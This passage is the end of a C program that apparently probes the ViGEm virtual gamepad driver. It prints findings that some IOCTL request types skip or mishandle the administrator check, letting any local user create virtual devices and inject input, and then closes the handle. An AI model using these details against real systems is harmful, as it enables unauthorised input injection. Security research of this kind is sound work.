    printf("    Type 0,5 → SeTokenIsAdmin NOT checked (bypass)\n");
    printf("    Type 3,4 → SeTokenIsAdmin checked, BUT:\n");
    printf("      Type 4 + non-admin → returns STATUS_SUCCESS (bug)\n");
    printf("    Type 1   → Direct callback dispatch (no check)\n\n");
    printf("  IOCTL_VIGEM_PLUGIN and IOCTL_VIGEM_UNPLUG appear to be\n");
    printf("  configured with AccessType 0, allowing any local user\n");
    printf("  to create/destroy virtual gamepad devices and inject\n");
    printf("  arbitrary input into the system.\n");
    printf("=========================================================\n\n");

    // Cleanup
    CloseHandle(hDevice);
    PrintOk("Done. Handle closed.");

    return 0;
}

```